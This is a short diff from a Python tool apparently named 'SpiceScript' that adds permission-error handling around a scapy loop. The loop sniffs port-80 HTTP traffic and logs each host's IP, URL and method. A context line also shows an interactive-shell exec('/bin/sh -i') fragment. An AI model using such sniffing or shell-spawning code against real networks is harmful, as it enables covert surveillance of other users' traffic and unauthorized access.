@@ -882,7 +882,11 @@ exec("/bin/sh -i");
                                     method = packet[HTTPRequest].Method.decode()
                                     print("[\u001b[32m+\u001b[0m] " + str(ip) + " Requested \u001b[32m" + str(url) + "\u001b[0m with \u001b[32m" + str(method) + "\u001b[0m")
                             while True:
-                                sniff(filter="port 80", prn=process_packet, store=False)
+                                try:
+                                    sniff(filter="port 80", prn=process_packet, store=False)
+                                except PermissionError:
+                                    print("[-] Error: SpiceScript doesn't have the correct permissions! Try running it with 'sudo' or as a super user!")
+                                    break
 
 
                             input("Press ENTER To Go Back.")
